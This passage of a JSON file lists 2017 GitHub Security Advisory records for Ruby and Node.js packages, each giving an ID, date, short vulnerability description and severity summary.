    "description": "The numtok function in lib/raven/okjson.rb in the raven-ruby gem before 0.12.2 for Ruby allows remote attackers to cause a denial of service via a large exponent value in a scientific number.",
    "summary": "Moderate severity vulnerability that affects sentry-raven"
  },
  {
    "ghsaId": "GHSA-q5pq-pgrv-fh89",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The dns-sync module before 0.1.1 for node.js allows context-dependent attackers to execute arbitrary commands via shell metacharacters in the first argument to the resolve API function.",
    "summary": "Critical severity vulnerability that affects dns-sync"
  },
  {
    "ghsaId": "GHSA-9959-c6q6-6qp3",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "**Withdrawn:** Duplicate of GHSA-79mx-88w7-8f7q",
    "summary": "Moderate severity vulnerability that affects validator"
  },
  {
    "ghsaId": "GHSA-xqg8-cv3h-xppv",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "SQL injection vulnerability in Sequelize before 2.0.0-rc7 for Node.js allows remote attackers to execute arbitrary SQL commands via the order parameter.",
    "summary": "High severity vulnerability that affects sequelize"
  },
  {
    "ghsaId": "GHSA-cfjh-p3g4-3q2f",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Incomplete blacklist vulnerability in marked 0.3.2 and earlier for Node.js allows remote attackers to conduct cross-site scripting (XSS) attacks via a vbscript tag in a link.",
    "summary": "Moderate severity vulnerability that affects marked"
  },
  {
    "ghsaId": "GHSA-4whc-pp4x-9pf3",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "jquery_ujs.js in jquery-rails before 3.1.3 and 4.x before 4.0.4 and rails.js in jquery-ujs before 1.0.4, as used with Ruby on Rails 3.x and 4.x, allow remote attackers to bypass the Same Origin Policy, and trigger transmission of a CSRF token to a different-domain web server, via a leading space character in a URL within an attribute value.",
    "summary": "Moderate severity vulnerability that affects jquery-rails and jquery-ujs"
  },
  {
    "ghsaId": "GHSA-6jvm-3j5h-79f6",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The thoughtbot paperclip gem before 4.2.2 for Ruby does not consider the content-type value during media-type validation, which allows remote attackers to upload HTML documents and conduct cross-site scripting (XSS) attacks via a spoofed value, as demonstrated by image/jpeg.",
    "summary": "Moderate severity vulnerability that affects paperclip"
  },
  {
    "ghsaId": "GHSA-67j6-xv27-w6ww",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "request.rb in Web Console before 2.1.3, as used with Ruby on Rails 3.x and 4.x, does not properly restrict the use of X-Forwarded-For headers in determining a client's IP address, which allows remote attackers to bypass the whitelisted_ips protection mechanism via a crafted request.",
    "summary": "Moderate severity vulnerability that affects web-console"
  },
  {
    "ghsaId": "GHSA-rgr4-9jh5-j4j6",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "lib/rack/utils.rb in Rack before 1.5.4 and 1.6.x before 1.6.2, as used with Ruby on Rails 3.x and 4.x and other products, allows remote attackers to cause a denial of service (SystemStackError) via a request with a large parameter depth.",
    "summary": "Moderate severity vulnerability that affects rack"
  },
  {
    "ghsaId": "GHSA-vxvp-4xwc-jpp6",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Cross-site scripting (XSS) vulnerability in json/encoding.rb in Active Support in Ruby on Rails 3.x and 4.1.x before 4.1.11 and 4.2.x before 4.2.2 allows remote attackers to inject arbitrary web script or HTML via a crafted Hash that is mishandled during JSON encoding.",
    "summary": "Moderate severity vulnerability that affects activesupport"
  },
  {
    "ghsaId": "GHSA-j96r-xvjq-r9pg",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The (1) jdom.rb and (2) rexml.rb components in Active Support in Ruby on Rails before 4.1.11 and 4.2.x before 4.2.2, when JDOM or REXML is enabled, allow remote attackers to cause a denial of service (SystemStackError) via a large XML document depth.",
    "summary": "Moderate severity vulnerability that affects activesupport"
  },
  {
    "ghsaId": "GHSA-mx9f-w8qq-q5jf",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "REST client for Ruby (aka rest-client) before 1.7.3 logs usernames and passwords, which allows local users to obtain sensitive information by reading the log.",
    "summary": "Low severity vulnerability that affects rest-client"
  },
  {
    "ghsaId": "GHSA-333x-9vgq-v2j4",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Directory traversal vulnerability in lib/app/index.js in Geddy before 13.0.8 for Node.js allows remote attackers to read arbitrary files via a ..%2f (dot dot encoded slash) in the PATH_INFO to the default URI.",
    "summary": "Moderate severity vulnerability that affects geddy"
  },
  {
    "ghsaId": "GHSA-73qw-ww62-m54x",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The initialize method in the Histogram class in lib/colorscore/histogram.rb in the colorscore gem before 0.0.5 for Ruby allows context-dependent attackers to execute arbitrary code via shell metacharacters in the (1) image_path, (2) colors, or (3) depth variable.",
    "summary": "Critical severity vulnerability that affects colorscore"
  },
  {
    "ghsaId": "GHSA-vxp4-25qp-86qh",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nCross-site scripting (XSS) vulnerability in Ember.js 1.8.x through 1.10.x, 1.11.x before 1.11.4, 1.12.x before 1.12.2, 1.13.x before 1.13.12, 2.0.x before 2.0.3, 2.1.x before 2.1.2, and 2.2.x before 2.2.1 allows remote attackers to inject arbitrary web script or HTML.",
    "summary": "Moderate severity vulnerability that affects ember"
  },
  {
    "ghsaId": "GHSA-p692-7mm3-3fxg",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The http_basic_authenticate_with method in actionpack/lib/action_controller/metal/http_authentication.rb in the Basic Authentication implementation in Action Controller in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not use a constant-time algorithm for verifying credentials, which makes it easier for remote attackers to bypass authentication by measuring timing differences.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-xrr6-3pc4-m447",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "activerecord/lib/active_record/nested_attributes.rb in Active Record in Ruby on Rails 3.1.x and 3.2.x before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not properly implement a certain destroy option, which allows remote attackers to bypass intended change restrictions by leveraging use of the nested attributes feature.",
    "summary": "Moderate severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-59c7-4xj2-hgvw",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Cross-site scripting (XSS) vulnerability in the rails-html-sanitizer gem before 1.0.3 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via crafted tag attributes.",
    "summary": "Moderate severity vulnerability that affects rails-html-sanitizer"
  },
  {
    "ghsaId": "GHSA-r9c2-cr39-c8g6",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Cross-site scripting (XSS) vulnerability in the rails-html-sanitizer gem 1.0.2 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via an HTML entity that is mishandled by the Rails::Html::FullSanitizer class.",
    "summary": "Moderate severity vulnerability that affects rails-html-sanitizer"
  },
  {
    "ghsaId": "GHSA-ghqm-pgxj-37gq",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Cross-site scripting (XSS) vulnerability in lib/rails/html/scrubbers.rb in the rails-html-sanitizer gem before 1.0.3 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via a crafted CDATA node.",
    "summary": "Moderate severity vulnerability that affects rails-html-sanitizer"
  },
  {
    "ghsaId": "GHSA-9h6g-gp95-x3q5",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "actionpack/lib/action_dispatch/routing/route_set.rb in Action Pack in Ruby on Rails 4.x before 4.2.5.1 and 5.x before 5.0.0.beta1.1 allows remote attackers to cause a denial of service (superfluous caching and memory consumption) by leveraging an application's use of a wildcard controller route.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-3fx5-fwvr-xrjg",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The ms package before 0.7.1 for Node.js allows attackers to cause a denial of service (CPU consumption) via a long version string, aka a \"regular expression denial of service (ReDoS).\"",
    "summary": "High severity vulnerability that affects ms"
  },
  {
    "ghsaId": "GHSA-hjcp-j389-59ff",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The marked package before 0.3.4 for Node.js allows attackers to cause a denial of service (CPU consumption) via unspecified vectors that trigger a \"catastrophic backtracking issue for the em inline rule,\" aka a \"regular expression denial of service (ReDoS).\"",
    "summary": "High severity vulnerability that affects marked"
  },
  {
    "ghsaId": "GHSA-x6fg-f45m-jf5q",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The semver package before 4.3.2 for Node.js allows attackers to cause a denial of service (CPU consumption) via a long version string, aka a \"regular expression denial of service (ReDoS).\"",
    "summary": "High severity vulnerability that affects semver"
  },
  {
    "ghsaId": "GHSA-v633-x5vv-hqwc",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Cross-site scripting (XSS) vulnerability in the serve-index package before 1.6.3 for Node.js allows remote attackers to inject arbitrary web script or HTML via a crafted file or directory name.",
    "summary": "Moderate severity vulnerability that affects serve-index"
  },
  {
    "ghsaId": "GHSA-34r7-q49f-h37c",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The uglify-js package before 2.4.24 for Node.js does not properly account for non-boolean values when rewriting boolean expressions, which might allow attackers to bypass security mechanisms or possibly have unspecified other impact by leveraging improperly rewritten Javascript.",
    "summary": "High severity vulnerability that affects uglify-js"
  },
  {
    "ghsaId": "GHSA-c9f4-xj24-8jqx",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The uglify-js package before 2.6.0 for Node.js allows attackers to cause a denial of service (CPU consumption) via crafted input in a parse call, aka a \"regular expression denial of service (ReDoS).\"",
    "summary": "High severity vulnerability that affects uglify-js"
  },
  {
    "ghsaId": "GHSA-jgqf-hwc5-hh37",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The send package before 0.11.1 for Node.js allows attackers to obtain the root path via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects send"
  },
  {
    "ghsaId": "GHSA-gfjr-3jmm-4g9v",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The tar package before 2.0.0 for Node.js allows remote attackers to write to arbitrary files via a symlink attack in an archive.",
    "summary": "Moderate severity vulnerability that affects tar"
  },
  {
    "ghsaId": "GHSA-fmr4-7g9q-7hc7",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "**Withdrawn:** Duplicate of GHSA-9prh-257w-9277",
    "summary": "Moderate severity vulnerability that affects handlebars"
  },
  {
    "ghsaId": "GHSA-w3w8-37jv-2c58",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "mustache package before 2.2.1 for Node.js allows remote attackers to conduct cross-site scripting (XSS) attacks by leveraging a template with an attribute that is not quoted.",
    "summary": "Moderate severity vulnerability that affects mustache"
  },
  {
    "ghsaId": "GHSA-q86f-fmqf-qrf6",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The mail gem before 2.5.5 for Ruby (aka A Really Ruby Mail Library) is vulnerable to SMTP command injection via CRLF sequences in a RCPT TO or MAIL FROM command, as demonstrated by CRLF sequences immediately before and after a DATA substring.",
    "summary": "Moderate severity vulnerability that affects mail"
  },
  {
    "ghsaId": "GHSA-ffpv-c4hm-3x6v",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "actionpack/lib/action_dispatch/http/mime_type.rb in Action Pack in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not properly restrict use of the MIME type cache, which allows remote attackers to cause a denial of service (memory consumption) via a crafted HTTP Accept header.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-xrr4-p6fq-hjg7",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "Directory traversal vulnerability in Action View in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 allows remote attackers to read arbitrary files by leveraging an application's unrestricted use of the render method and providing a .. (dot dot) in a pathname.",
    "summary": "Moderate severity vulnerability that affects actionview"
  },
  {
    "ghsaId": "GHSA-543v-gj2c-r3ch",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "Active Model in Ruby on Rails 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 supports the use of instance-level writers for class accessors, which allows remote attackers to bypass intended validation steps via crafted parameters.",
    "summary": "Moderate severity vulnerability that affects activemodel"
  },
  {
    "ghsaId": "GHSA-h5g2-38x9-4gv3",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "Directory traversal vulnerability in the minitar before 0.6 and archive-tar-minitar 0.5.2 gems for Ruby allows remote attackers to write to arbitrary files via a .. (dot dot) in a TAR archive entry.",
    "summary": "High severity vulnerability that affects archive-tar-minitar and minitar"
  },
  {
    "ghsaId": "GHSA-4jm3-pfpf-h54p",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "The espeak-ruby gem before 1.0.3 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a string to the speak, save, bytes or bytes_wav method in lib/espeak/speech.rb.",
    "summary": "High severity vulnerability that affects espeak-ruby"
  },
  {
    "ghsaId": "GHSA-f7f4-5w9j-23p2",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "The festivaltts4r gem for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a string to the (1) to_speech or (2) to_mp3 method in lib/festivaltts4r/festival4r.rb.",
    "summary": "High severity vulnerability that affects festivaltts4r"
  },
  {
    "ghsaId": "GHSA-gvcj-pfq2-wxj7",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "Untrusted search path vulnerability in Atom Electron before 0.33.5 allows local users to gain privileges via a Trojan horse Node.js module in a parent directory of a directory named on a require line.",
    "summary": "High severity vulnerability that affects electron"
  },
  {
    "ghsaId": "GHSA-vx9j-46rh-fqr8",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "Directory traversal vulnerability in Action View in Ruby on Rails before 3.2.22.2 and 4.x before 4.1.14.2 allows remote attackers to read arbitrary files by leveraging an application's unrestricted use of the render method and providing a .. (dot dot) in a pathname.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-0752.",
    "summary": "Moderate severity vulnerability that affects actionview"
  },
  {
    "ghsaId": "GHSA-78rc-8c29-p45g",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "Action Pack in Ruby on Rails before 3.2.22.2, 4.x before 4.1.14.2, and 4.2.x before 4.2.5.2 allows remote attackers to execute arbitrary Ruby code by leveraging an application's unrestricted use of the render method.",
    "summary": "High severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-f522-ffg8-j8r6",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "The is-my-json-valid package before 2.12.4 for Node.js has an incorrect exports['utc-millisec'] regular expression, which allows remote attackers to cause a denial of service (blocked event loop) via a crafted string.",
    "summary": "Regular Expression Denial of Service in is-my-json-valid"
  },
  {
    "ghsaId": "GHSA-c92m-rrrc-q5wf",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "The Safemode gem before 1.2.4 for Ruby, when initialized with a delegate object that is a Rails controller, allows context-dependent attackers to obtain sensitive information via the inspect method.",
    "summary": "High severity vulnerability that affects safemode"
  },
  {
    "ghsaId": "GHSA-87vv-r9j6-g5qv",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "The duration function in the moment package before 2.11.2 for Node.js allows remote attackers to cause a denial of service (CPU consumption) via a long string, aka a \"regular expression Denial of Service (ReDoS).\"",
    "summary": "High severity vulnerability that affects moment"
  },
  {
    "ghsaId": "GHSA-j5hj-fhc9-g24m",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "The rack-mini-profiler gem before 0.10.1 for Ruby allows remote attackers to obtain sensitive information about allocated strings and objects by leveraging incorrect ordering of security checks.",
    "summary": "Moderate severity vulnerability that affects rack-mini-profiler"
  },
  {
    "ghsaId": "GHSA-pc3m-v286-2jwj",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "Cross-site scripting (XSS) vulnerability in Action View in Ruby on Rails 3.x before 3.2.22.3, 4.x before 4.2.7.1, and 5.x before 5.0.0.1 might allow remote attackers to inject arbitrary web script or HTML via text declared as \"HTML safe\" and used as attribute values in tag handlers.",
    "summary": "Moderate severity vulnerability that affects actionview"
  },
  {
    "ghsaId": "GHSA-pr3r-4wrp-r2pv",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "Action Record in Ruby on Rails 4.2.x before 4.2.7.1 does not properly consider differences in parameter handling between the Active Record component and the JSON implementation, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks or trigger missing WHERE clauses via a crafted request, as demonstrated by certain \"[nil]\" values, a related issue to CVE-2012-2660, CVE-2012-2694, and CVE-2013-0155.",
    "summary": "Moderate severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-3m6r-39p3-jq25",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "The Doorkeeper gem before 4.2.0 for Ruby might allow remote attackers to conduct replay attacks or revoke arbitrary tokens by leveraging failure to implement the OAuth 2.0 Token Revocation specification.",
    "summary": "Moderate severity vulnerability that affects doorkeeper"
  },
  {
    "ghsaId": "GHSA-hpcf-8vf9-q4gj",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "Cross-site scripting (XSS) vulnerability in jQuery UI before 1.12.0 might allow remote attackers to inject arbitrary web script or HTML via the closeText parameter of the dialog function.",
    "summary": "Moderate severity vulnerability that affects jquery-ui"
  },
  {
    "ghsaId": "GHSA-6h88-qjpv-p32m",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "The openssl gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.",
    "summary": "Moderate severity vulnerability that affects openssl"
  },
  {
    "ghsaId": "GHSA-2fqv-h3r5-m4vf",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "Plotly, Inc. plotly.js versions prior to 1.16.0 are vulnerable to an XSS issue.",
    "summary": "Moderate severity vulnerability that affects plotly.js"
  },
  {
    "ghsaId": "GHSA-gcqq-w6gr-h9j9",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "The Zip::File component in the rubyzip gem before 1.2.1 for Ruby has a directory traversal vulnerability. If a site allows uploading of .zip files, an attacker can upload a malicious file that uses \"../\" pathname substrings to write arbitrary files to the filesystem.",
    "summary": "High severity vulnerability that affects rubyzip"
  },
  {
    "ghsaId": "GHSA-5vx5-9q73-wgp4",
    "publishedAt": "2017-10-24T18:33:35Z",
    "description": "rubygem-safemode, as used in Foreman, versions 1.3.1 and earlier are vulnerable to bypassing safe mode limitations via special Ruby syntax. This can lead to deletion of objects for which the user does not have delete permissions or possibly to privilege escalation.",
    "summary": "High severity vulnerability that affects safemode"
  }
]